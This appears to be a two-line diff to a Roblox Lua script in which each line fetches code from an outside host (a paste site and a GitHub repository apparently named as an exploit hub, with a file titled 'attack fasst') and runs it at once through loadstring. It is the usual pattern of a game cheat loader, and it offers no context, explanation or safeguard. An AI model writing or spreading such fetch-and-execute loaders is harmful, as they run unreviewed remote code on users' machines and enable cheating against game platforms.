@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://pastefy.app/uFaS3yKA/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Testgameak/RYNtraxHub/refs/heads/main/attack%20fasst"))()
